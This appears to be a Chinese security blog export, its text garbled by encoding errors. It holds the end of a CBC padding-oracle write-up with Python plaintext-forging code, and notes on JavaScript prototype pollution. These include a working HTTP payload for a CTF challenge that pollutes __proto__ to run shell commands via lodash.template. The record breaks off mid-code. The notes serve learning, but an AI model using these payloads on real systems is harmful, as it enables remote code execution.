plain</span><br></pre></td></tr></table></figure><p>æ¢³ç†ä¸€ä¸‹ï¼Œåœ¨çŸ¥æ™“secretå’Œivçš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å…ˆæ¨å¯¼ä¸­é—´å€¼ï¼Œæ¥ç€æ¨å¯¼åŸæ˜æ–‡ã€‚</p><h1 id="ä¼ªé€ æ˜æ–‡"><a href="#ä¼ªé€ æ˜æ–‡" class="headerlink" title="ä¼ªé€ æ˜æ–‡"></a>ä¼ªé€ æ˜æ–‡</h1><p>æ¨å¯¼å‡º<strong>ä¸­é—´å€¼</strong>åï¼Œå¯ä»¥ä¼ªé€ æ–°æ˜æ–‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âˆµ intermediary ^ new_iv = fake_plain</span><br><span class="line">âˆ´ fake_iv=intermediary ^ fake_plain</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªé•¿åº¦åœ¨ä¸€ä¸ªåˆ†ç»„é•¿åº¦å†…çš„å¯†æ–‡ï¼Œæ¯”å¦‚â€œ7654321â€ï¼š</p><ol><li>PKCS#5å¡«å……ï¼Œå¾—åˆ°â€œ7654321\x01â€</li><li><code>new_iv=b&quot;\xf9\x57\x2b\x03\x78\x17\xad\x46&quot; ^ b&quot;7654321\x01&quot;=b&quot;\xce\x61\x1e\x37\x4b\x25\x9c\x47&quot;</code></li><li>decode(â€œc8c9c4f092468f9eâ€,key,â€œce611e374b259c47â€) = â€œ7654321â€</li></ol><p>ä»£ç å®ç°å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(secret_block: bytearray, fake_plain: bytearray)</span>-&gt;(bytearray, bytearray):</span></span><br><span class="line">    block_len=len(secret_block)</span><br><span class="line">    <span class="keyword">if</span> len(fake_plain)&lt;block_len:</span><br><span class="line">        fake_plain=pkcs5(fake_plain, block_len)</span><br><span class="line"></span><br><span class="line">    intermedi=burp_intermediary(secret_block, block_len)</span><br><span class="line">    iv=bytearray(block_len) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        iv[i]=intermedi[i]^fake_plain[i]</span><br><span class="line">    logging.info(<span class="string">"Fake IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret_block.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret_block</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç®—æ³•è¾“å…¥å®é™…ä¸Šåªæœ‰éœ€è¦åŠ å¯†çš„<strong>æ˜æ–‡</strong>ï¼ˆ<strong>secret</strong>å¯ä»¥ä¸ºä»»æ„å€¼ï¼‰ï¼Œè¾“å‡ºå®é™…ä¸Šåªæœ‰ivï¼ˆsecretåŸæ ·è¿”å›ï¼‰ã€‚</p><h2 id="ä¼ªé€ ä»»æ„é•¿åº¦çš„æ˜æ–‡"><a href="#ä¼ªé€ ä»»æ„é•¿åº¦çš„æ˜æ–‡" class="headerlink" title="ä¼ªé€ ä»»æ„é•¿åº¦çš„æ˜æ–‡"></a>ä¼ªé€ ä»»æ„é•¿åº¦çš„æ˜æ–‡</h2><p>æ ¹æ®CBCçš„è§£å¯†æµç¨‹ï¼Œå°†æœ€åä¸€å—åŠ å¯†äº§ç”Ÿçš„IVä½œä¸ºå€’æ•°ç¬¬äºŒå—çš„secretï¼Œä»¥å‰çš„å€’æ•°ç¬¬iå—IVä½œä¸ºå€’æ•°ç¬¬i-1å—çš„secretï¼Œä¾æ¬¡å‘å‰ç®—å¾—æ‰€æœ‰å¯†æ–‡ï¼Œæœ€åäº§ç”Ÿçš„IVä½œä¸ºåˆå§‹IVã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain: bytearray, block_len: int)</span>-&gt;bytearray:</span></span><br><span class="line">    idxs=list(range(<span class="number">0</span>, len(plain), block_len))</span><br><span class="line">    secret=bytearray()</span><br><span class="line">    secret_block=bytearray(block_len)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> idxs[::<span class="number">-1</span>]:</span><br><span class="line">        iv, secret_block=encrypt_block(secret_block, plain[idx:idx+<span class="number">8</span>])</span><br><span class="line">        secret=secret_block+secret</span><br><span class="line">        secret_block=iv</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">"IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret</span><br></pre></td></tr></table></figure><h1 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h1><p>åœ¨åŠ å¯†æ—¶ï¼Œä¸ä½¿ç”¨é»˜è®¤çš„ivï¼Œè€Œä½¿ç”¨<code>sha(salt+password)</code>æ¥äº§ç”Ÿivï¼Œè¿™æ ·åœ¨å¯†ç ä¼ é€’æ—¶å°±ä¸éœ€è¦å‘é€ivï¼Œè§£å¯†æ—¶é‡æ–°è®¡ç®—çš„åˆ°ivè§£å¯†å³å¯ï¼Œå…¶å®ä¸åŠ <code>salt</code>ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯ä¸ºäº†é˜²æ­¢çˆ†ç ´è¿˜æ˜¯åŠ ä¸€ä¸‹å§ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ•´ç†ä¸€ä¸‹ï¼Œåœ¨æ”»å‡»è€…çŸ¥æ™“åŠ å¯†æ–¹å¼ä¸ºAES/DES-CBCï¼Œå¯†æ–‡ä»¥åŠåˆå§‹åŒ–å‘é‡é•¿åº¦åï¼Œå¯ä»¥è§£å¯†åŸä¸­é—´å€¼ï¼›æ”»å‡»è€…çŸ¥æ™“å¯†æ–‡ä»¥åŠåˆå§‹åŒ–å‘é‡å€¼åï¼Œå¯ä»¥è¿›ä¸€æ­¥è§£å¯†åŸæ˜æ–‡ï¼›æ”»å‡»è€…åœ¨åªçŸ¥æ™“åŠ å¯†æ–¹å¼ä¸ºAES/DES-CBCæƒ…å†µä¸‹ï¼Œå¯ä»¥ä¼ªé€ æ˜æ–‡ï¼Œå½“ç„¶æ•´ä¸ªå¤§å‰ææ˜¯æ”»å‡»è€…å¯ä»¥å¤šæ¬¡è°ƒç”¨è§£å¯†ç¨‹åºï¼Œå¹¶ä¸”è§£å¯†ç¨‹åºåœ¨paddingä¸åˆæ³•æ—¶æŠ¥é”™ã€‚</p><p><strong>ä»£ç ï¼š</strong><a href="https://github.com/Anemone95/padding-oracle-attack" target="_blank" rel="noopener">https://github.com/Anemone95/padding-oracle-attack</a></p><h1 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h1><ol><li>Automated Padding Oracle Attacks With PadBusterï¼Œ<a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a></li><li>Padding Oracleï¼Œ<a href="https://www.jianshu.com/p/1851f778e579" target="_blank" rel="noopener">https://www.jianshu.com/p/1851f778e579</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> CBC </tag>
            
            <tag> PaddingOracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ç¬”è®°</title>
      <link href="/JS-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/JS-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="prototypeå’Œ-proto"><a href="#prototypeå’Œ-proto" class="headerlink" title="prototypeå’Œ__proto__"></a><code>prototype</code>å’Œ<code>__proto__</code></h1><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><code>prototype</code></h2><p>Javascriptçš„ç±»æ˜¯é€šè¿‡æ„é€ å‡½æ•°åˆ›å»ºçš„ï¼Œè€Œç»™ç±»å¢åŠ æ–¹æ³•åˆ™éœ€è¦ä½¿ç”¨prototypeï¼Œç±»ä¼¼äºè®¾è®¡æ¨¡å¼ä¸­çš„åŸå‹æ¨¡å¼ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h2><p><code>prototype</code>åªèƒ½åœ¨ç±»ï¼ˆæ¢å¥è¯è¯´ï¼Œæ„é€ å‡½æ•°ï¼‰ä¸Šä½¿ç”¨ï¼Œå¦‚æœæƒ³åœ¨å®ä½“åŒ–çš„ç±»ä¸Šä½¿ç”¨åˆ™éœ€è¦ä½¿ç”¨<code>__proto__</code>å±æ€§ï¼Œå³ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__.show == Foo.prototype.show</span><br></pre></td></tr></table></figure><h1 id="åŸå‹é“¾ç»§æ‰¿"><a href="#åŸå‹é“¾ç»§æ‰¿" class="headerlink" title="åŸå‹é“¾ç»§æ‰¿"></a>åŸå‹é“¾ç»§æ‰¿</h1><p>å­ç±»å°†å…¶prototypeèµ‹å€¼ä¸ºä¸€ä¸ªçˆ¶ç±»å¯¹è±¡å®ä¾‹ï¼Œè¡¨ç¤ºå…¶ç»§æ‰¿çˆ¶ç±»ã€‚å¯¹äºå­å¯¹è±¡çš„å±æ€§ï¼Œè‹¥å…¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šé€’å½’æŸ¥æ‰¾å…¶çˆ¶å¯¹è±¡ï¼Œä¸¾ä¾‹è¯´æ˜ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Donald'</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">'Trump'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Melania'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>) <span class="comment">//è¾“å‡ºMelania Trump</span></span><br></pre></td></tr></table></figure><p>å¯¹äºå¯¹è±¡sonï¼Œåœ¨è°ƒç”¨<code>son.last_name</code>çš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ol><li>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name</li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>son.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>son.__proto__.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li></ol><h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><p>è€ƒè™‘ä»¥ä¸‹æƒ…å†µï¼Œå¦‚æœä½¿ç”¨<code>son.__proto__.name=&quot;son&quot;</code>ï¼Œé‚£ä¹ˆä¼šé€ æˆ<code>daughter.name=son</code></p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/uml.svg" alt="uml"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sonæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> son = &#123;<span class="attr">name</span>: <span class="string">"mike"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// son.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹sonçš„åŸå‹ï¼ˆå³Objectï¼‰</span></span><br><span class="line">son.__proto__.name = <span class="string">"poison"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> daughter = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥çœ‹daughter.name(daughter.name="poison")</span></span><br><span class="line"><span class="built_in">console</span>.log(daughter.name)</span><br></pre></td></tr></table></figure><p><code>foo.__proto__==zoo.__proto__==object</code></p><h2 id="å‘ç”Ÿåœºæ™¯"><a href="#å‘ç”Ÿåœºæ™¯" class="headerlink" title="å‘ç”Ÿåœºæ™¯"></a>å‘ç”Ÿåœºæ™¯</h2><p>jsä¸­çš„mergeã€cloneæ“ä½œï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h2><p>å¤±è´¥çš„åˆ©ç”¨ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p>æˆåŠŸçš„åˆ©ç”¨ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p><strong>è§£é‡Š:</strong><br>å¤±è´¥åˆ©ç”¨çš„<code>__proto__</code>å®é™…ä¸Šæ˜¯ä½¿o2çš„<code>__proto__</code>ä¸º<code>{b:2}</code>ï¼Œå³<code>o2.__proto__={b:2}</code>ï¼Œè¿™æ ·<code>for</code>éå†æ—¶æŒ‡æŒ¥éå†<code>a,b</code>ï¼Œè€Œä¸ä¼šéå†åˆ°<code>__proto__</code>ã€‚</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1556024722140.png" alt="1556024722140"></p><p>æˆåŠŸæ–¹æ³•çš„JSON.parseä¼šä½¿o2çš„<code>__proto__</code>ä¸ºä¸€ä¸ªæ™®é€šçš„é”®åç§°ï¼Œæ‰€ä»¥åœ¨<code>let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)</code>åo2çš„åŸå‹æ˜¯æ²¡æœ‰bå±æ€§çš„ï¼Œè€Œåœ¨mergeåä¼šå°†o2çš„åŸå‹ï¼ˆobjectï¼‰å¢åŠ ä¸€ä¸ªbå±æ€§ã€‚</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1556025479492.png" alt="1556025479492"></p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>å‚è€ƒpç¥å‡ºçš„<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js" target="_blank" rel="noopener">Code-Breaking 2018 Thejs</a> é¢˜ç›®ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//source</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language,</span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>sourceï¼Œç”¨æˆ·è¾“å…¥çš„bodyä¼ å…¥mergeæ–¹æ³•:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lodash.merge(data, req.body)</span><br></pre></td></tr></table></figure></p><p>sinkä¸º<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>å’Œç¬¬8è¡Œï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Function(arg1,arg2,â€¦,funcbody)ï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œä¸¾ä¾‹å­æ›´å¥½è¯´æ˜ï¼š</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1556109443518.png" alt="1556109443518"></p><p>Function.apply(object, args)å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¯ä»¥ç†è§£ä¸º<code>object.function(arg1, arg2)ï¼Œargs=[arg1, arg2]</code>ï¼Œä¾‹å¦‚ï¼š</p><p><img src="/JS-åŸå‹é“¾æ±¡æŸ“/1556110289896.png" alt="1556110289896"></p><p>å†è§£é‡Šä¸€ä¸‹attemptï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°attemptçš„è¾“å…¥å‚æ•°æ˜¯(func[,args])ï¼Œè€ƒè™‘åˆ°jsç‰¹æ€§â€”â€”å‡è®¾function(arg1,arg2,arg3)å®šä¹‰çš„å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå…¶è°ƒç”¨æ—¶å‚æ•°ä¸ªæ•°å¯ä»¥å°äº3ï¼Œå®é™…ç›¸å½“äº<code>func.apply</code>ï¼Œè€ŒçœŸæ­£å‘ç”Ÿè°ƒç”¨æ˜¯åœ¨ç¬¬8è¡Œã€‚</p><h2 id="æœ‰ç¼ºé™·çš„Payload"><a href="#æœ‰ç¼ºé™·çš„Payload" class="headerlink" title="æœ‰ç¼ºé™·çš„Payload"></a>æœ‰ç¼ºé™·çš„Payload</h2><p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥é€šè¿‡åŸå‹æ±¡æŸ“åˆ°objectï¼Œä½¿optionsä¹Ÿæœ‰sourceURLå±æ€§ï¼Œæ„é€ å‡ºå¦‚ä¸‹çš„payloadï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.70.138:8086</span><br><span class="line"><span class="attribute">Content-Length</span>: 198</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.70.138:8086</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.70.138:8086/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"__proto__": &#123;"sourceURL": "\u000areturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"&#125;&#125;</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹payloadï¼Œ<code>e=&gt;{return ...}</code>æ˜¯ES6çš„åŒ¿åå‡½æ•°åˆ›å»ºè¯­æ³•ï¼Œç›¸å½“äº</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> ...;</span><br><span 